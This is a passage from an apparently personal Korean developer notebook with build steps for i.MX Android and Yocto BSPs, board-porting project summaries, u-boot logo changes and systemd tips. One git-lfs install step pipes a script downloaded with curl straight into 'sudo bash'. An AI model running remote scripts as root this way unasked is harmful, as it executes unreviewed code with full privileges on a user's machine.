    $ source /home/ybgwon/Work/Freescale/MX6/Android/5.1.1-Lollipop/Source/android_L5.1.1_2.1.0-ga_core_source/code/L5.1.1_2.1.0-ga/and_patch.sh
    $ c_patch /home/ybgwon/Work/Freescale/MX6/Android/5.1.1-Lollipop/Source/android_L5.1.1_2.1.0-ga_core_source/code/L5.1.1_2.1.0-ga/ imx_L5.1.1_2.1.0-ga
    ```
7.  build  
    
    ```text
    $ cd ~/a/llp
    $ source build/envsetup.sh
    $ lunch sabresd_6dq-user
    $ make 2>&1 | tee build-log.txt
    ```


### <span class="section-num">3.285</span> Freescale Android 6.0.1\_2.1.0 Marshmallow build {#freescale-android-6-dot-0-dot-1-2-dot-1-dot-0-marshmallow-build}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-02-11 토 15:54&gt;</span></span>  

1.  권장빌드환경  
    Ubuntu 14.04 64bit, openjdk-7-jdk  
    -   빌드시 필요한 패키지 설치  
        
        ```text
        $ sudo apt-get install uuid uuid-dev zlib1g-dev liblz-dev \
        liblzo2-2 liblzo2-dev lzop git-core curl u-boot-tools mtd-utils \
        android-tools-fsutils openjdk-7-jdk
        ```

2.  make source directory  
    make Android(a)/Marshmallow(mm) source directory and link  
    
    ```text
    $ mkdir ~/a/M6.0.1_2.1.0; cd ~/a
    $ ln -s M6.0.1_2.1.0 mm
    ```
3.  repo sync  
    
    ```text
    $ cd ~/a/mm
    $ repo init --reference=~/a/llp -u https://android.googlesource.com/platform/manifest -b android-6.0.1_r22
    $ repo sync
    ```
4.  checkout kernel  
    
    ```text
    $ git clone git://git.freescale.com/imx/linux-2.6-imx.git kernel_imx 
    $ cd kernel_imx
    $ git checkout  m6.0.1_2.1.0-ga
    ```
5.  checkout u-boot  
    
    ```text
    $ cd ~/a/mm/bootable/bootloader
    $ git clone git://git.freescale.com/imx/uboot-imx.git uboot-imx
    $ cd uboot-imx
    $ git checkout  m6.0.1_2.1.0-ga
    ```
6.  patch  
    
    ```text
    $ cd ~/a/mm
    $ source /home/ybgwon/Work/Freescale/MX6/Android/6.0.1_2.10-Marshmallow/Source/android_M6.0.1_2.1.0_source/code/M6.0.1_2.1.0/and_patch.sh
    $ c_patch /home/ybgwon/Work/Freescale/MX6/Android/6.0.1_2.10-Marshmallow/Source/android_M6.0.1_2.1.0_source/code/M6.0.1_2.1.0/ imx_M6.0.1_2.1.0
    ```
7.  build  
    
    ```text
    $ cd ~/a/mm
    $ source build/envsetup.sh
    $ lunch sabresd_6dq-user
    $ make 2>&1 | tee build-log.txt
    ```


### <span class="section-num">3.286</span> imx6 ubuntu rootfs build {#imx6-ubuntu-rootfs-build}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-02-22 수 17:41&gt;</span></span>  


#### <span class="section-num">3.286.1</span> Trusty {#trusty}

1.  커널 imx\_3.14.52 버전 사용
2.  debootstrap 을 이용한 설치시 xserver-xorg-core 버전이 맞이않아  
    startx 에서 에러가 난다. linaro lxde 에 있는 x 파일들을복사해 와야 한다.
3.  default kenel config 에서 MXC\_GPU\_VIV=n 으로 설정하고  
    galcore 모듈은 외부에서 빌드한 파일을 module 디렉토리에복사한다.
4.  일반 사용자로 실행시 /dev/mxc\_\* 파일들이 600 퍼미션이라  
    gstreamer 사용시 에러가 난다.(debootstrap 설치 버전)
5.  gstreamer 강제 종료후 화면이 복귀되지 않는 버그가 있다.
6.  chromium 브라우저가 실행되지 않는다. (debootstrap 버전)
7.  창이동이 매끄럽지 못하다.

1.   링크

    <https://community.nxp.com/docs/DOC-330147>  
    <http://trac.gateworks.com/wiki/ventana/ubuntu#gstreamer-imx>  


#### <span class="section-num">3.286.2</span> Xenial {#xenial}

1.  커널 4.1.15 버전을 사용한다.
2.  Boundary Devices 의 ubuntu image 를 사용한다.
3.  Kernel Config  
    
    ```text
    CONFIG_FHANDEL=y
    CONFIG_MXC_GPU_VIV is not set
    ```
4.  make galcore module  
    
    ```text
    $ git clone https://github.com/Freescale/kernel-module-imx-gpu-viv.git
    $ cd kernel-module-imx-gpu-viv
    $ git checkout upstream/5.0.11.p7.4
    $ make KERNEL_SRC=~/yt/git/linux-imx
    $ cp kernel-module-imx-gpu-viv-src/galcore.ko rootfs/lib/modules/updates/dkms/
    ```
5.  nfs 부팅시 readonly 로 마운트되므로 remount 하여야 한다.(커널업그레이드-4.1.15\_2.0.0 후 현재 rw로 마운트 된다.)

1.   링크

    <https://boundarydevices.com/ubuntu-xenial-mx67-boards-august-2016-kernel-4-1-15/>  


### <span class="section-num">3.287</span> firefox awesome bar {#firefox-awesome-bar}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-03-24 금 12:41&gt;</span></span>  
firefox awesome bar shortcut  

```text
Add ^ to search for matches in your browsing history.
Add * to search for matches in your bookmarks.
Add + to search for matches in pages you've tagged.
Add % to search for matches in your currently open tabs.
Add ~ to search for matches in pages you've typed.
Add # to search for matches in page titles.
Add @ to search for matches in web addresses (URLs).
Add $ to search for matches in suggestions. 
```


### <span class="org-todo done DONE">DONE</span> <span class="section-num">3.288</span> 개발 서버 SSD 장착후 업그레이드 <code>[2/2]</code> {#개발-서버-ssd-장착후-업그레이드}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-07-19 수 09:37&gt;</span></span>  

1.  [X] 개발환경 설정하기
2.  [X] 디렉토리 정리


### <span class="section-num">3.289</span> Brother MFC-J2310 프린터 설정 {#brother-mfc-j2310-프린터-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-07-24 월 18:03&gt;</span></span>  
brother 홈페이지에서 mfcj2310lpr-3.0.1-1.i386.deb 파일과  
mfcj2310cupswrapper-3.0.1-1.i386.deb 파일을 다운받는다.  
패키지를 설치한후 cups 설정을 한다.  

1.  브라우저에서 아래 패이지에 접속한다.  
    <http://localhost:631/printers>  
    Linux Mint 18.2 Sonya 에서는 접속 아이디와 패스워드가사용자 아이디 패스워드로 변경되었다.
2.  프린터를 클릭하면 나오는 페이지의 Administration 드랍다운메뉴에서 Modify Printer 선택
3.  다음페이지에서 AppSocket/HP JetDirect 선택
4.  다음페이지에서 socket://192.168.0.170:9100 입력


### <span class="section-num">3.290</span> 아르정보기술 프로젝트 {#아르정보기술-프로젝트}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-08-02 수 10:42&gt;</span></span>  


#### <span class="section-num">3.290.1</span> NXP(구 FreeScale) I.MX6 보드 리눅스 포팅 {#nxp--구-freescale--i-dot-mx6-보드-리눅스-포팅}

1.   목적

    버스 광고용 디바이스  

2.   보드사양

    i.MX6DUAL Processor, LVDS, HDMI, i2c, USB, AR5B22 PCIe Wlan,  
    DS1339 External RTC,  M24C02 EEPROM, SDCard, LAN8720A 100M Ethernet,  
    SGTL5000 Audio, 4UART, UBLOX\_GPS, GPIO  

3.   리눅스 커널

    3.0.35  

4.   작업내역

    1.  LG LM230WF3 패널 lvds 출력 - 1920x1080p split mode
    2.  LAN8720A RMII Ethenet 포팅
    3.  SGTL5000 sound 포팅
    4.  I2C 제어 RTC, EEPROM 포팅
    5.  Atheros PCIe wireless card 포팅
    6.  부트로더, 커널, rootfs 설정
    7.  LTIB 빌드 사용
    8.  qt-everywhere-opensource-src-4.8.4 포팅
    9.  Merge Upstream Bugfix


#### <span class="section-num">3.290.2</span> NXP I.MX6 보드 리눅스 포팅 {#nxp-i-dot-mx6-보드-리눅스-포팅}

1.   목적

    버스 광고용 디바이스 업그레이드  

2.   보드사양

    i.MX6DUAL Processor, LVDS, HDMI, i2c, USB, AR5B22 PCIe Wlan,  
    DS1339 External RTC,  M24C02 EEPROM, SDCard, LAN8720A 100M Ethernet,  
    SGTL5000 Audio, 4UART, UBLOX\_GPS, GPIO, GPIO IR Receiver,  
    Ambient light sensor, GPIO-KEY  

3.   리눅스 커널

    4.1.15  

4.   작업내역

    1.  LG LM230WF3 패널 lvds 출력 - 1920x1080p split mode
    2.  LAN8720A RMII Ethenet 포팅
    3.  SGTL5000 sound 포팅
    4.  I2C 제어 RTC, Sensor, EEPROM 포팅
    5.  Atheros PCIe wireless card 포팅
    6.  GPIO IR Receiver 포팅
    7.  GPIO KEY 설정
    8.  Device Tree 설정
    9.  부트로더, 커널, rootfs, yocto 설정


#### <span class="section-num">3.290.3</span> NXP I.MX28 보드 리눅스 포팅 {#nxp-i-dot-mx28-보드-리눅스-포팅}

1.   목적

    버스 광고용 디바이스 보조 디바이스  

2.   보드 사양

    i.MX28 Processor, Samsung K4T1G164QG-BCE7 1G DDR2 SDRAM,  
    RK050FR43-T TFT LCD, SGTL5000 sound, LAN8720A,  
    MT29F4G08ABADAWP-I Nand Flash, Buzzer, GPIO-Key  

3.   리눅스 커널

    4.4.x  

4.   작업내역

    1.  Samsung K4T1G164QG-BCE7 1G DDR2 SDRAM 포팅
    2.  RK050FR43-T TFT LCD (800x480) 포팅
    3.  MICRON Nand Flash 포팅
    4.  Buzzer, GPIO-Key 설정
    5.  Device Tree 설정
    6.  부트로더, 커널, rootfs 설정
    7.  Freescale Yocto Community BSP 설정


#### <span class="section-num">3.290.4</span> NXP I.MX6 보드 안드로이드 포팅 {#nxp-i-dot-mx6-보드-안드로이드-포팅}

1.   목적

    미용실 거울형 안드로이드 디바이스  

2.   보드사양

    i.MX6QUAD Processor, LVDS, HDMI, EMMC16G, SAMSUNG DDR8G,  
    I2C, RTC, EEPROM, SGTL5000 Audio, LAN8720A, BCM43362 WIFI BLUETOOTH,  
    SDCARD, UART, USB 근접센서, USB Multitouch  

3.   안드로이드 버전

    Kitkat 4.4.2  
    리눅스커널 버전 3.0.35  

4.   작업내역

    1.  Samsung K4B8G1646Q DDR3L SDRAM 설정
    2.  LG DISPLAY LD420EUB lvds 설정
    3.  EMMC 5.1 Support
    4.  RMII 100M Ethernet 설정
    5.  SGTL5000 Sound 설정
    6.  Sharp USB Multi Touch Device 설정
    7.  UVC Camera 설정
    8.  Mfgtools 펌웨어 라이팅 툴 설정
    9.  근접센서 등 센서 설정
    10. MIPI Camera 설정
    11. Broadcom bcm4330 wifi bluetooth 포팅


#### <span class="section-num">3.290.5</span> NXP I.MX6 보드 리눅스 포팅 {#nxp-i-dot-mx6-보드-리눅스-포팅}

1.   목적

    데이터 수집 장치  

2.   보드사양

    i.MX6DUAL Processor, i2c, USB, SDCard, LAN8720A 100M Ethernet,  
    LCD, GPIO Expander, W5300 TCPIP CHIP x 4  

3.   리눅스 커널

    4.1.15  

4.   작업내역

    1.  CT2118T500G TFT LCD(800x480 24bitRGB) 설정
    2.  LAN8720A RMII Ethenet 포팅
    3.  PCA9698BS i2c gpio expander 포팅
    4.  GPIO POLLD KEYS 설정
    5.  WIZNET W5300 TCPIP CHIP 포팅
    6.  Device Tree 설정
    7.  부트로더, 커널, rootfs, yocto 설정


#### <span class="section-num">3.290.6</span> NEXELL S5P4418 NAVI REF 리눅스 포팅 {#nexell-s5p4418-navi-ref-리눅스-포팅}

1.   목적

    에너지 데이터 로깅 장치  

2.   보드 사양

    S5P4418, SAMSUNG DDR3 K4B2G1646Q, USB 4port Serial,  
    Gigabit LAN, LoRa Module  

3.   작업내역

    1.  SAMSUNG DDR3 K4B2G1646Q SDRAM 포팅
    2.  PMIC i2c 설정
    3.  CP210X usb 4port serial 포팅
    4.  REALTEK 8211e Gigabit Ethernet 포팅
    5.  8188EU USB WIFI 포팅
    6.  IDOLINK LORA 모듈 포팅
    7.  부트로더, 커널, rootfs 설정


#### <span class="section-num">3.290.7</span> Raspberry PI 리눅스 포팅 {#raspberry-pi-리눅스-포팅}

1.   목적

    네이버 전산실 감시 카메라  

2.   보드 사양

    Raspberry PI 3 Model B v1.2, PiCamera, Stepper Motor,  
    Sensor(Temperature, Humedity, Motion)  

3.   작업내역

    1.  PiCamera 스트리밍 설정
    2.  28BYJ-48 Stepper Motor 설정
    3.  DHT11 온습도 센서 설정
    4.  Passive Infrared (PIR) motion sensor 설정


#### <span class="section-num">3.290.8</span> ALLWINNER A31 {#allwinner-a31}

1.   EBCARD 운전자 단말기 LED 디스플레이보드 연동 프로그래밍

2.   A31 커널 소스 분석및 버그 수정


### <span class="section-num">3.291</span> python socketserver {#python-socketserver}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-08-02 수 17:47&gt;</span></span>  
The right name is SocketServer in Python2 and socketserver in Python3.  


### <span class="section-num">3.292</span> ternary operator (?:) {#ternary-operator}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-08-03 목 14:42&gt;</span></span>  
variable = condition ? value\_if\_true : value\_if\_false  

```C
result = a > b ? x : y;
```

```PYTHON
result = x if a > b else y
```

<https://en.wikipedia.org/wiki/%3F:#Python>  


### <span class="section-num">3.293</span> Kant build {#kant-build}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-08-14 월 17:37&gt;</span></span>  

1.  git lfs 설치  
    
    ```text
    $ curl -s https://packagecloud.io/install/repositories/github/git-lfs/script.deb.sh | sudo os=ubuntu dist=xenial bash
    $ sudo apt-get install git-lfs=2.2.0
    ```
2.  저장소 설정  
    
    ```text
    $ mkdir a && cd a
    $ git init
    $ git lfs install
    $ git clone https://github.com/kant2016/Rosemary
    ```


### <span class="section-num">3.294</span> imx nugat porting {#imx-nugat-porting}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-08-14 월 18:10&gt;</span></span>  
camera, sound 충돌은 디바이스 트리의 AVDD-supply 부분을  
vgen5로 변경하고 소리가 나기는 하나 여전히 충돌이 있는듯 하다.  
touch 는 InputReader.cpp를 변경하고 반영이 안되어소스를 에러를 집어넣고 에러를 낸다음 다시 수정하여컴파일하니 된다.  


### <span class="section-num">3.295</span> build android-7.1.2\_r9 {#build-android-7-dot-1-dot-2-r9}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-12-26 화 00:57&gt;</span></span>  

1.  권장 OS  
    Ubuntu 14.04 64bit version and openjdk-8-jdk
2.  Needed Package  
    
    ```text
    $ sudo apt-get install uuid uuid-dev zlib1g-dev liblz-dev \
    liblzo2-2 liblzo2-dev lzop git-core curl u-boot-tools mtd-utils \
    android-tools-fsutils openjdk-8-jdk
    ```
3.  Get Source  
    
    ```text
    $ cd $ANDROID_ROOT
    $ repo init -u https://android.googlesource.com/platform/manifest -b android-7.1.2_r9
    $ repo sync
    ```
    
    clone bpt.git  
    
    ```text
    $ cd system/tools
    $ git clone https://android.googlesource.com/platform/system/tools/bpt
    $ cd bpt
    $ git checkout -b n7.1.2_2.0.0-ga b7c3059e5d8c408f60222edc898ef1c229d8fc2d 
    ```
4.  Get Kernel Source  
    
    ```text
    $ cd $ANDROID_ROOT
    $ git clone git://git.freescale.com/imx/linux-imx.git kernel_imx
    $ cd kernel_imx
    $ git checkout n7.1.2_2.0.0-ga
    ```
5.  Get Bootloader  
    
    ```text
    $ cd $ANDROID_ROOT/bootable
    $ mkdir bootloader && cd bootloader
    $ git clone git://git.freescale.com/imx/uboot-imx.git uboot-imx
    $ cd uboot-imx
    $ git checkout n7.1.2_2.0.0-ga
    ```
6.  Patch  
    Assume you have unzipped the i.MX Android release package to  
    /opt/android\_N7.1.2\_2.0.0\_source  
    
    ```text
    $ cd $ANDROID_ROOT
    $ source /opt/android_N7.1.2_2.0.0_source/code/N7.1.2_2.0.0/and_patch.sh
    $ c_patch /opt/android_N7.1.2_2.0.0_source/code/N7.1.2_2.0.0/ imx_N7.1.2_2.0.0-ga
    ```
7.  build  
    
    ```text
    $ source build/envsetup.sh
    $ lunch sabresd_7d-user
    $ make 2>&1 | tee build-log.txt
    ```


### <span class="section-num">3.296</span> Sublime Text {#sublime-text}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-01-17 수 13:59&gt;</span></span>  

1.  콘솔보기  
    Ctrl + \` 를 입력하거나 메뉴에서 View > Show Console 선택
2.  command palette  
    .sublime-commands files 내용을 보여준다.  
    Ctrl + Shift + p
3.  창분리 가로  
    Alt + Shift + 8
4.  창분리 세로  
    Alt + Shift + 2
5.  창분리 하나  
    Alt + Shift + 1
6.  repl\_python\_run  
    Ctrl + Alt + b


### <span class="section-num">3.297</span> IMX7 Android Oreo build {#imx7-android-oreo-build}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-03-09 금 21:33&gt;</span></span>  

1.  required package  
    
    ```text
    $ sudo apt-get install uuid uuid-dev zlib1g-dev liblz-dev
    liblzo2-2 liblzo2-dev lzop git-core curl u-boot-tools
    mtd-utils android-tools-fsutils openjdk-8-jdk
    device-tree-compiler gdisk
    ```
2.  Java Env set openjdk-8
3.  create root directory  
    user guide 에서 제시하는 imx\_android\_setup.sh 는디렉토리 설정이 안되고 오히려 성가시다. 그냥 이전처럼 수동으로 하는 편이 낫다.  
    
    ```text
    $ cd ~/a
    $ mkdir O8.0.0_1.0.0-Oreo
    $ ln -s O8.0.0_1.0.0-Oreo Oo
    ```
4.  repo sync  
    
    ```text
    $ repo init -u https://source.codeaurora.org/external/imx/imx-manifest.git -b imx-android-oreo -m imx-o8.0.0_1.0.0_ga.xml
    $ repo sync
    ```
5.  Copy all the proprietary packages to the android build folder  
    
    ```text
    $ cd /home/ybgwon/Work/Freescale/MX6/Android/8.0.0_1.0.0-Oreo/imx-o8.0.0_1.0.0_ga
    $ cp -r vendor/nxp ~/a/Oo/vendor
    $ cp -r EULA.txt ~/a/Oo/
    $ cp -r SCR* ~/a/Oo/
    ```
6.  build  
    
    ```text
    $ source build/envsetup.sh
    $ lunch sabresd_7d-userdebug
    $ make 2>&1 | tee build-log.txt
    ```


### <span class="section-num">3.298</span> Build imx-yocto-L4.9.88\_2.0.0 {#build-imx-yocto-l4-dot-9-dot-88-2-dot-0-dot-0}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-06-07 목 15:38&gt;</span></span>  


#### <span class="section-num">3.298.1</span> Host package {#host-package}

```text
$ sudo apt-get install gawk wget git-core diffstat unzip texinfo \
gcc-multilib build-essential chrpath  socat  libsdl1.2-dev
```


#### <span class="section-num">3.298.2</span> Project Setup {#project-setup}

```text
$ cd ~/yt/bsp && mkdir L4.9.88_2.0.0 && cd L4.9.88_2.0.0
$ repo init -u https://source.codeaurora.org/external/imx/imx-manifest \
-b imx-linux-rocko -m imx-4.9.88-2.0.0_ga.xml
$ repo sync
```


#### <span class="section-num">3.298.3</span> Build configurations {#build-configurations}

1.  MACHINE  
    
    ```text
    imx6qpsabreauto
    imx6qpsabresd
    imx6ulevk
    imx6ull14x14evk
    imx6ull9x9evk
    imx6dlsabreauto
    imx6dlsabresd
    imx6qsabreauto
    imx6qsabresd
    imx6slevk
    imx6solosabreauto
    imx6solosabresd
    imx6sxsabresd
    imx6sxsabreauto
    imx6sllevk
    imx7dsabresd
    imx7ulpevk
    imx8mq
    ```
2.  DISTRO  
    1.  fsl-imx-x11 - X11 graphics are not supported on i.MX 8
    2.  fsl-imx-wayland - Wayland weston graphics.
    3.  fsl-imx-xwayland - Wayland graphics and X11.  
        X11 applications using EGL are not supported.
    4.  fsl-imx-fb - Frame Buffer graphics - no X11 or Wayland.  
        Frame Buffer is not supported on i.MX
3.  fsl-setup-release.sh 문법  
    
    ```text
    $ DISTRO=<distro name> MACHINE=<machine name> source fsl-setup-release.sh -b <build dir>
    $ DISTRO=fsl-imx-x11 MACHINE=imx6qsabresd source fsl-setup-release.sh -b build-x11
    ```
4.  Restart Build Environment  
    
    ```text
    $ source setup-environment <build-dir>
    $ source setup-environment build-x11
    ```


#### <span class="section-num">3.298.4</span> Build Image {#build-image}

1.  i.MX Yocto Project Image  
    
    ```text
    core-image-minimal
    core-image-base
    core-image-sato
    fsl-image-machine-test
    fsl-image-validation-imx
    fsl-image-qt5-validation-imx
    ```
2.  bitbake  
    Builds an i.MX image with a GUI without any Qt content.  
    
    ```text
    $ bitbake fsl-image-validation-imx
    ```


#### <span class="section-num">3.298.5</span> U-Boot config emmc {#u-boot-config-emmc}

```text
$ echo "UBOOT_CONFIG = \"emmc\"" >> conf/local.conf
$ MACHINE=<machine name> bitbake -c deploy u-boot-imx
```


#### <span class="section-num">3.298.6</span> Build U-boot and Kernel in Stand Alone Environment {#build-u-boot-and-kernel-in-stand-alone-environment}

1.  Generate SDK  
    
    ```text
    $ DISTRO=fsl-imx-fb MACHINE=Target-Machine bitbake core-image-minimal -c populate_sdk
    ```
2.  U-Boot  
    
    ```text
    $ git clone https://source.codeaurora.org/external/imx/uboot-imx \
    -b imx_v2017.03_4.9.88_2.0.0_ga
    $ cd uboot-imx
    $ make mx6ull_14x14_evk_defconfig
    $ make -j8
    ```
3.  Kernel  
    
    ```text
    $ git clone https://source.codeaurora.org/external/imx/linux-imx \
    -b imx_4.9.88_2.0.0_ga
    $ cd linux-imx
    $ make imx_v7_defconfig
    $ make -j8
    ```


### <span class="section-num">3.299</span> w5300 link detect 구현 {#w5300-link-detect-구현}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-06-29 금 10:36&gt;</span></span>  

1.  w5300 의 LINKLED 핀을 gpio 에 연결한다.
2.  디바이스 트리에서 LINKLED 에 연결된 gpio 핀 설정을 한다.
3.  w5300 소스에서 link\_gpio 부분을 디바이스 트리에서 지정한  
    gpio 로 지정해 준다.

<https://forum.wiznet.io/t/topic/467/2>  


### <span class="section-num">3.300</span> persistent systemd journal {#persistent-systemd-journal}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-09-17 월 18:55&gt;</span></span>  
/etc/systemd/journald.conf 기본값은  
Storage=auto 이다.  
이렇게 되었을 경우 /var/log/journal 디렉토리가 없을 경우저널은 파일에 저장되지 않고 런타임으로만 볼 수 있다.  
journalctl -b -1 명령으로 이전 부트 메시지를 볼 수 없다.  
journal을 storage 에 저장하기 위해서는 /etc/systemd/journald.conf  
에서 Storage=persistent 로 설정하거나  
/var/log/journal 디렉토리를 만들어 주면 된다.  

```text
$ sudo mkdir /var/log/journal
$ sudo systemctl restart systemd-journald
```

<https://wiki.archlinux.org/index.php/Systemd#Journal>  


### <span class="section-num">3.301</span> gstreamer test video display {#gstreamer-test-video-display}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-09-19 수 10:28&gt;</span></span>  

```text
$ gst-launch-1.0 videotestsrc ! videoconvert ! autovideosink
```


### <span class="section-num">3.302</span> u-boot splash 변경 {#u-boot-splash-변경}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-10-19 금 13:38&gt;</span></span>  
freescale 보드에서의 splash 설정  

1.  In config file, enable splash screen  
    
    ```text
    Add:
    #define CONFIG_SPLASH_SCREEN
    ```
2.  set splash screen enviroment variables  
    
    ```text
    setenv splashimage ‘0x97c90000’
    setenv splashpos ‘0,0’
    setenv lvds_num 1
    
    splashimage is the image address that will be loaded.
    splashpos is the image position that will be displayed.
    If you want to use lvds0, then set lvds_num to 0.
    ```

splash 변경  

1.  bmp 이미지 준비. 이미지 사이즈가 크면 변환되어 만들어지는 파일사이즈가 너무 커지므로 적당한 1M 아래로 만든다.
2.  bin2txt.py 로 .c 파일 생성
3.  Put converted bmp.c to board/freescale/common/fsl\_bmp\_600x400.c
4.  Modify Makefile to build it.


#### <span class="section-num">3.302.1</span> v2017.03\_4.9.11\_1.0.0\_ga 버전에서의 splash 설정 {#v2017-dot-03-4-dot-9-dot-11-1-dot-0-dot-0-ga-버전에서의-splash-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-12-13 목 16:46&gt;</span></span>  
이 버전부터는 tools/logos/ 디렉토리 아래 bmp 파일들을 사용한다.  
Makefile을 보면 $(BOARD).bmp 나 $(VENDOR).bmp 파일이 있으면이를 사용하도록 되어 있으므로 디렉토리 아래 freescale.bmp 파일이있으므로 freescale.bmp 파일이 로고로 사용된다.  
custom 파일로 이를 변경하기 위해서는  

1.  사용하려는 custom logo 파일을 크기와 형식에 맞게 변환하여  
    logo 디렉토리에 복사한다. 아래는 480x272 크기의 LCD에 맞게변환하는 예이다.  
    
    ```text
    $ cd ~/Pictures/u-boot-logo
    $ convert -resize 480x272\! son.png son2.png
    $ convert son2.png -type Palette -colors 224 -compress none -verbose BMP3:areinfo.bmp
    $ cp areinfo.bmp /home/ybgwon/yt/aurora/b/tools/logos/
    ```
    
    여기서 주의할 것은  
    \#define CONFIG\_HIDE\_LOGO\_VERSION  
    을 정의 하지 않으면 logo version 관련 글자가 출력될 여백이 있어야하므로 그림파일의 크기를 lcd 크기보다 작게 하여 글자가 출력될 수있는 여백을 확보하여야 한다. 굳이 logo version을 출력할 이유가없다면 CONFIG\_HIDE\_LOGO\_VERSION 을 정의 하면 된다.
2.  tools/Makefile 에서 custom logo를 추가한다.  
    
    ```text
    --- a/tools/Makefile
    +++ b/tools/Makefile
    @@ -222,6 +222,9 @@ LOGO-$(CONFIG_LCD_LOGO) += $(LOGO_DATA_H)
    LOGO-$(CONFIG_VIDEO_LOGO) += $(LOGO_H)
    LOGO-$(CONFIG_VIDEO_LOGO) += $(LOGO_DATA_H)
    
    +# custom logo
    +LOGO_BMP= $(srctree)/$(src)/logos/areinfo.bmp	
    +
    # Generic logo
    ifeq ($(LOGO_BMP),)
    LOGO_BMP= $(srctree)/$(src)/logos/denx.bmp
    ```

<https://developer.toradex.com/knowledge-base/u-boot-splash-screen>  


### <span class="section-num">3.303</span> git push up to specific commit {#git-push-up-to-specific-commit}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-11-27 화 13:44&gt;</span></span>  
모든 커밋을 push 하기 보다 특정 커밋까지만 remote 저장소에  
push 해야 할 때가 있다.  

```text
git push <remotename> <commit SHA>:<remotebranchname>
```

<https://coderwall.com/p/hexinq/git-push-up-to-a-certain-commit>  


### <span class="section-num">3.304</span> systemd silent boot {#systemd-silent-boot}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-12-19 수 18:29&gt;</span></span>  
systemd boot log 메시지를 비활성화하는 방법이다.  
커널 부트 커멘드 라인에 아래를 추가한다.  

```text
systemd.show_status=false
```

[stackexchange](https://unix.stackexchange.com/questions/332798/prevent-systemd-from-logging-status-lines-to-a-tty)  


### <span class="section-num">3.305</span> tar 특정 디렉토리나 파일 제외 하고 묶기 {#tar-특정-디렉토리나-파일-제외-하고-묶기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-12-21 금 17:11&gt;</span></span>  

```text
$ tar -jcvf MyBackup.tar.gz --exclude={"/home/user/public_html/tmp","/home/user/public_html/data"} /home/user/public_html/
```

<https://stackoverflow.com/questions/4290174/excluding-directory-when-creating-a-tar-gz-file>  


### <span class="section-num">3.306</span> network monitor {#network-monitor}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-12-24 월 12:12&gt;</span></span>  
네트워크 모니터링 툴로는 ntopng 가 web interfaces를 사용하여그럴싸한 화면을 보여준다. command line 에서 간단하게 활용할 수 있는툴을 찾아 보았다.  


#### <span class="section-num">3.306.1</span> nethogs {#nethogs}

네트워크 트래픽 사용량이 많은 순으로 정렬해서 소켓 정보를 보여준다.  

```text
$ sudo nethogs
```


#### <span class="section-num">3.306.2</span> iftop {#iftop}

개별 소켓 연결 흐름 측정. n 옵션은 name resolving 을 수행하지 않으므로부가적인 트래픽을 막는다.  

```text
$ sudo iftop -n
```


### <span class="section-num">3.307</span> systemd boot-up performance check {#systemd-boot-up-performance-check}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-12-28 금 11:29&gt;</span></span>  
systemd-analyze 를 사용하여 부팅 관련 정보 보기  

1.  부팅시간 관련 정보 보기  
    
    ```text
    root@imx6qpdlsolox:~# systemd-analyze                                                                                                                             
    Startup finished in 2.106s (kernel) + 1.957s (userspace) = 4.063s
    ```
    
    하지만 grapserial 명령어로 확인 한 것과는 또다른 결과이다.  
    u-boot 쪽에 걸린 시간 은 빠져있는 듯하다. 그렇다고 grapserial 의 총부팅시간에서 위의 숫자를 뺀다 해도 u-boot 쪽의 부팅시간만 남는 것같지는 않다. grepserial 의 경우도 실제로 초시계를 가지고 측정한 부팅시간과는 다르다. 1초정도 적게 나온다. 하지만 사용자 측면에서 볼때부팅시간은 초시계로 잰 시간이 제일 체감하는 시간일 것이다.

2.  가장 오래 걸린 서비스부터 정렬  
    blame argurment를 사용한다.  
    
    ```text
    root@imx6qpdlsolox:~# systemd-analyze blame
           6.511s dropbearkey.service
           1.761s dev-mmcblk2p2.device
            878ms systemd-logind.service
            488ms ntpdate.service
            479ms systemd-udev-trigger.service
            376ms avahi-daemon.service
            246ms systemd-timesyncd.service
            220ms systemd-journald.service
            144ms rc-local.service
             78ms systemd-udevd.service
             55ms systemd-backlight@backlight:backlight.service
             52ms systemd-backlight@backlight:backlight-buzzer.service
             51ms systemd-remount-fs.service
             50ms systemd-update-utmp.service
             49ms systemd-update-utmp-runlevel.service
             48ms systemd-journal-flush.service
             45ms sys-kernel-debug.mount
             44ms systemd-tmpfiles-clean.service
             36ms tmp.mount
             36ms systemd-sysctl.service
             34ms systemd-tmpfiles-setup-dev.service
             30ms dev-mmcblk2p1.device
             29ms proc-fs-nfsd.mount
             27ms systemd-tmpfiles-setup.service
             26ms systemd-modules-load.service
             23ms sys-fs-fuse-connections.mount
             20ms systemd-random-seed.service
             19ms systemd-vconsole-setup.service
             11ms var-volatile.mount
    ```

3.  remote machine 의 정보 보기  
    -H flag 사용아래는 remote machine 부트 정보를 svg 파일로 저장한 후  
    local에서 xviewer 를 이용하여 확인하는 예이다.  
    
    ```text
    $ systemd-analyze plot -H root@192.168.0.105 > /tmp/boot.svg
    $ xviewer /tmp/boot.svg
    ```

<https://www.tecmint.com/systemd-analyze-monitor-linux-bootup-performance/>  


### <span class="section-num">3.308</span> 컴퓨터 자동 켜기 {#컴퓨터-자동-켜기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-12-28 금 14:21&gt;</span></span>  
